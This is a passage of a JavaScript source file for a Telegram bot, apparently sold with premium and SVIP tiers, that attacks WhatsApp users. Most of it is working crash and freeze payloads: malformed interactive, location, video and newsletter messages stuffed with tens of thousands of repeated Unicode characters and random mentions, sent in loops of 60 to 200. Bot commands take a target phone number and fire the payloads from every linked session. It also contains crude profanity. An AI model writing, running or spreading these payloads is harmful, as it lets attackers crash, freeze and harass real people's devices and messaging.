                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, message, {
        participant: { jid: jid }
    });
}

async function VampPrivateBlank(sock, jid) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Vampire Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(jid, message, { participant: { jid: jid } });
}

           async function VampCrashIos(sock, jid) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await sock.relayMessage(jid, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@iqbhalkeifer25"
                                   }
                           }, {
                                   participant: {
                                           jid: jid
                                   }
                           });
                           console.log("Send Bug By Vampire");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function VampAttack(sock, jid) {
    let msg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Vampire.biz\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Aku Kembali Hehe!!!" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Jangan Bacot Cil..."
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(jid, msg.message, { participant: { jid: jid } }, { messageId: null });
}
async function VampCrash(sock, jid) {
    let msg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Vampire.source\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Shut Up Your Mouth" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Licked Pussy"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "I Hate A Bocil"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(jid, msg.message, { participant: { jid: jid } }, { messageId: null });
}

async function freezeIphone(sock, jid) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "i p h o n e - f r e e z e" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: jid,
  },
},
{
  messageId: null,
}
);
}

async function VampiPhone(sock, jid) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Halo iPhone... Vampire Is Back" + "ꦾ".repeat(120000),
                                jpegThumbnail: renlol,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(jid, messsage, {
                    userJid: jid,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

async function VampDelayAttack(sock, jid, mention = false) {
    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "Jangan Berisik...",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "Vampire" + "ꦽ".repeat(9000),
                                    title: "VampCrash",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

const VampUiApi = JSON.stringify({
  status: true,
  criador: "VampireAttack",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VampSpamUi(sock, jid) {
  sock.relayMessage(
    jid,
    {
      interactiveMessage: {
        header: {
          title: "Vampire Here Bro!!!\n\n" + "Kamu Bacot Yaa\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
          hasMediaAttachment: false
        },
        body: {
          text: "Jangan Tengil Idiot...",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "payment_method", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "call_permission_request", buttonParamsJson: VampUiApi + "\u0003", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "catalog_message", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "send_location", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "view_product", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "payment_status", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "cta_call", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "cta_url", buttonParamsJson: VampUiApi + "\u0003" },
            { name: "review_and_pay", buttonParamsJson: VampUiApi + "\u0003" }
          ]
        }
      }
    },
    { participant: { jid: jid } }
  );
}

async function VampCrashCH(jid) {
  const msg = generateWAMessageFromContent(jid, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: jid }); // Perbaiki dari jid ke jid

  await sock.relayMessage(jid, msg.message, { 
    messageId: msg.key.id 
  });
}

async function VampNotif(sock, jid) {
for (let i = 0; i < 80; i++) {
await VampSpamUi(sock, jid)
await VampAttack(sock, jid)
await VampCrash(sock, jid)
}
}

async function VampEasyDelay(sock, jid) {
for (let i = 0; i < 80; i++) {
await VampDeviceCrash(sock, jid)
await VampDeviceCrash(sock, jid)
}
}

async function VampMediumDelay(sock, jid) {
for (let i = 0; i < 200; i++) {
await VampDelayAttack(sock, jid, mention = false)
await VampDelayAttack(sock, jid, mention = false)
}
}

async function VampHyperDelay(sock, target) {
for (let i = 0; i < 200; i++) {
await VampSuperDelay(sock, target, mention = false)
await VampSuperDelay(sock, target, mention = false)
}
}

async function VampUiCrash(sock, target) {
for (let i = 0; i < 200; i++) {
await VampSpamUi(sock, target)
}
}

async function VampHardDelay(sock, target) {
for (let i = 0; i < 200; i++) {
await VampDelayNew(sock, target, mention = false)
await VampDelayNew(sock, target, mention = false)
}
}

async function VampKilliPhone(sock, target) {
for (let i = 0; i < 60; i++) {
await VampCrashIos(sock, target)
await VampiPhone(sock, target)
await VampCrashIos(sock, target)
await VampDelayMess(sock, target)
await VampCrash(sock, target)
await VampDelayMess(sock, target)
}
}

async function VampCombo(sock, target) {
for (let i = 0; i < 60; i++) {
await VampSpamUi(sock, target)
await VampAttack(sock, target)
await VampCrash(sock, target)
await VampDelayMess(sock, target)
}
}

async function VampChannel(sock, target) {
for (let i = 0; i < 40; i++) {
await VampCrashCH(sock, target)
}
}

// MENU COMMAND SECTION
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username;
  const sessionCount = sessions.size;
  const uptime = typeof runtime === "function" ? runtime() : "Unknown";
  const statusList = getUserStatus(userId);
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '❗️Bot only used on group.', {
      parse_mode: 'Markdown'
    });
 }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
      caption:  `\`\`\`AnuuXstream
( 𖤓 ) -AlwaysNuuu   
─ Ола, меня зовут AnuuXstream Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек

《 ༑𝐀𝐧𝐮𝐮𝐗𝐬𝐭𝐫𝐞𝐚𝐦꙳⟅ 》
Developer : @AlwaysNuuu
Name User : ${username}
Version : 1.0
Status User : ${statusList}
Season :  ${sessionCount}
Waktu :  ${uptime}
Language : JavaScript

༑𝐏͢𝐫͡𝐞𝐬͜𝐬͡⍣᳟𝐁͡𝐮͢͡𝐭𝐭͢𝐨͜𝐧͡⍣᳟𝐌͡𝐞͡𝐧͢𝐮͜꙳⟅
\`\`\`
`,
parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "AnuuXstream support", callback_data: "partner_menu" }
          ],        
          [
            { text: "BUG ALL MENU", callback_data: "bug_menu" },
            { text: "OWNER MENU", callback_data: "owner_menu" }
          ],        
          [
            { text: "DEVELOPER", url: "https://t.me/AlwaysNuuu" }
          ],
        ]
      }
    });
    bot.sendAudio(chatId, "https://files.catbox.moe/qu46bd.m4a", {
      title: "EWOEW",
      performer: "Telegram",
      caption: "Anuu Is heree"
    });
});

//handler start 
bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const username = callbackQuery.from.username;
  const sessionCount = sessions.size;
  const statusList = getUserStatus(userId);
  const uptime = typeof runtime === "function" ? runtime() : "Unknown";

  bot.answerCallbackQuery(callbackQuery.id);

  if (data === "bug_menu") {
    bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/bclh0m.jpg",
      caption: `\`\`\`AnuuXstream
( 𖤓 ) -AlwaysNuuu   
─ Ола, меня зовут AnuuXstream Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек
━━━━━━━━━━━━━━━━━━━━━━━━━  
   ─────XCRASH─────
━━━━━━━━━━━━━━━━━━━━━━━━━  
• /snuke ⌁ [ɪɴᴠɪsɪʙʟᴇ]  
—  〢 Xtra Dozer × Hard Drain.  

• /superdelay ⌁ [ɪɴᴠɪsɪʙʟᴇ]  
—  〢 Super Delay x Strike Protocol.

• /frezedelay ⌁ [ɪɴᴠɪsɪʙʟᴇ]  
—  〢 Frozen Hammer × Super Delay Durable.

• /iphonedelay ⌁ [ᴠɪsɪʙʟᴇ]  
—  〢 ios Delay Responding.

• /sgroupx ⌁ [ᴠɪsɪʙʟᴇ]
—  〢 Glacier Hammer × Blank 

• /snitch ⌁ [button prefix]  
—  〢 Instant Attack.  
━━━━━━━━━━━━━━━━━━━━━━━━━  
─────────────────────────
━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``,
      parse_mode: "Markdown"
    }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 BACK 」", callback_data: "start_menu" }]
        ]
      }
    });
  } else if (data === "owner_menu") {
    bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/bclh0m.jpg",
      caption: `\`\`\`AnuuXstream
( 𖤓 ) - AlwaysNuuu   
─ Ола, меня зовут AnuuXstream Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек
╔──⪩ 𖡦 ⍣᷼ 𝐌𝐄𝐍𝐔 ⍣ 𖡦 ⪨──╗
  
  ▢ /addbot <ᴘᴀɪʀɪɴɢ>
  ▢ /setcd <ᴅᴇᴛɪᴋ> 
  ▢ /cekidgb
  ▢ /grouponly <ᴏɴ/ᴏꜰꜰ>
  ▢ /listbot
  ▢ /addsvip <ɪᴅ> <ᴅᴀʏs>
  ▢ /delsvip <ɪᴅ> <ᴅᴀʏs>
  ▢ /listsvip 
  ▢ /addprem <ɪᴅ> <ᴅᴀʏs>
  ▢ /delprem <ɪᴅ> <ᴅᴀʏs>
  ▢ /listprem 
  
╚──────────────────╝
\`\`\``,
      parse_mode: "Markdown"
    }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 BACK 」", callback_data: "start_menu" }]
        ]
      }
    });
  } else if (data === "partner_menu") {
    bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/bclh0m.jpg",
      caption: `\`\`\`AnuuXstream
( 𖤓 ) - AlwaysNuuu   
─ Ола, меня зовут AnuuXstream Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек
━━━━━━━━━━━━━━━━━━━━━━━
──────𝐓𝐇𝐀𝐍𝐊 𝐓𝐎──────
━━━━━━━━━━━━━━━━━━
ᝄ─ ALWAYSNUUU (Developer)
ᝄ─ WOLF (Support)
ᝄ─ CACA (SUPPORT)
ᝄ─ ALLAH (SUPPORT)
ᝄ─ All Buyer Script ☆
━━━━━━━━━━━━━━━━━━━
─────────────────────
━━━━━━━━━━━━━━━━━━━━━━━
—々AlwaysNuuu
\`\`\``,
      parse_mode: "Markdown"
    }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 BACK 」", callback_data: "start_menu" }]
        ]
      }
    });
  }else if (data === "start_menu") {
    bot.editMessageMedia({
      type: "photo",
      media: "https://files.catbox.moe/bclh0m.jpg",
      caption: `
\`\`\`AnuuXstreamw
( 𖤓 ) - AlwaysNuuu   
─ Ола, меня зовут AnuuXstream
  Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек
《 ༑𝐀𝐧𝐮𝐮𝐗𝐬𝐭𝐫𝐞𝐚𝐦꙳⟅ 》
Developer : @AlwaysNuuu
Name User : ${username}
Version : 1.0
Status User : ${statusList}
Season :  ${sessionCount}
Waktu :  ${uptime}
Language : JavaScript

༑𝐏͢𝐫͡𝐞𝐬͜𝐬͡⍣᳟𝐁͡𝐮͢͡𝐭𝐭͢𝐨͜𝐧͡⍣᳟𝐌͡𝐞͡𝐧͢𝐮͜꙳⟅
\`\`\``,
      parse_mode: "Markdown"
    }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "SUPPORT", callback_data: "partner_menu" }
          ],        
          [
            { text: "BUG MENU", callback_data: "bug_menu" },
            { text: "OWNER ─ MENU", callback_data: "owner_menu" }
          ],        
          [
            { text: "DEVELOPER", url: "https://t.me/AlwaysNuuu" }
          ], 
        ]
      }
    });
  }
});

//case button prefix
bot.onText(/\/snitch(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
  }

  const inputNumber = match[1];
  if (!inputNumber) {
    return bot.sendMessage(chatId, "❗️Example: `/snitch 62xxx`", { parse_mode: "Markdown" });
  }

  const targetNumber = inputNumber.replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/bclh0m.jpg", {
    caption: `
    \`\`\`AnuuXstream
( 𖤓 ) - AlwaysNuuu   
─ Ола, меня зовут AnuuXstream Infinity. Я был создан @AlwaysNuuu. И мне было поручено защитить вас от вреда и искоренить систему WhatsApp. #Марк Зупрек
━━━━━━━━━━━━━━━━━━━━━━━━━━
• /superbulldozer ⌁ [extrabulldozer]  
—  〢 Xtra Dozer × Hard Delay.  

• /superdelay ⌁ [ɪɴᴠɪsɪʙʟᴇ]  
—  〢 Super Delay x Strike Protocol.

• /frezedelay ⌁ [ɪɴᴠɪsɪʙʟᴇ]  
—  〢 Freze Delay × Super Delay Hour.

• /iphonedelay ⌁ [ᴠɪsɪʙʟᴇ]  
—  〢 ios Delay Responding.

• /sgroupx ⌁ [ᴠɪsɪʙʟᴇ]
—  〢 Glacier Hammer × Blank 
━━━━━━━━━━━━━━━━━━━━━━━━━━
( ! ) 𝘛𝘰 𝘢𝘵𝘵𝘢𝘤𝘬 𝘵𝘢𝘳𝘨𝘦𝘵 ${targetNumber} \n
───𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘪𝘴 𝘣𝘶𝘵𝘵𝘰𝘯 𝘣𝘦𝘭𝘰𝘸.
    \`\`\`
    `,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "SUPERBULLDOZER", callback_data: `snuke_${jid}` },
          { text: "SUPERDELAY", callback_data: `superdelay_${jid}` },
        ],
        [
          { text: "FREZEDELAY", callback_data: `frezedelay_${jid}` },
          { text: "IPHONEDELAY", callback_data: `iphonedelay_${jid}` },
        ],
        [
          { text: "SGROUPX", callback_data: `sgroupx_${jid}` },
        ],        
      ]
    }
  });
});



//handler prefix button command /snitchezs
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  const [methods, jid] = data.split("_");
  const bugType = methods;
  const formattedNumber = jid.split("@")[0];
  const username = callbackQuery.from.username || 'Unknown';

  if (!isPremium(userId) && !isOwner(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, "❌ *You don't have permission to access this feature.*", { parse_mode: "Markdown" });
  }

  const execute = {
    snuke,
    frezedelay,
    iphonedelay,
    superdelay,
    sgroupx,
  };

  const snitchAttack = execute[methods];
  if (!snitchAttack) return;

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ No active bot. Use /addbot.");
  }
  bot.sendPhoto(chatId, "https://files.catbox.moe/20lhhe.jpeg", {
    caption: `
\`\`\`
╭━━━⭓「 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 𝐒  」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : ${bugType.toUpperCase()}
┃ ◇ 𝐁𝐎𝐓 : ${sessions.size}
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ 
          text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
          url: `https://wa.me/${formattedNumber}`
        }],
      ],
    },
  });for (const [botNum, sock] of sessions.entries()) {
    (async () => {
      try {
        if (!sock.user) {
          console.log(`${botNum} Reconnecting..`);
          await initializeWhatsAppConnections();
          return;
        }
        await snitchAttack(sock, jid);
        console.log(`Attack ${bugType} success on ${formattedNumber}`);
      } catch (error) {
        console.error(`Error ${bugType}:`, error);
      }
    })();
  }
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  const user = supervipUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    supervipUsers = supervipUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(supervipFile, `const supervipUsers = ${JSON.stringify(supervipUsers, null, 2)};`);
    return false; 
  }
  return true; 
}

// COMMAND OWNER MENU SECTION
bot.onText(/\/addsvip(?:\s+(\d+))?\s+(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗Hanya OWNER yang bisa menambahkan SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example: /addsvip <id> <durasi>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const durationDays = parseInt(match[2]);

  if (!newUserId || isNaN(durationDays) || durationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau durasi tidak valid.");
  }

  const expirationTime = Date.now() + durationDays * 24 * 60 * 60 * 1000; 

  if (supervipUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah terdaftar sebagai SVIP.");
  }

  supervipUsers.push({ id: newUserId, expiresAt: expirationTime });

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
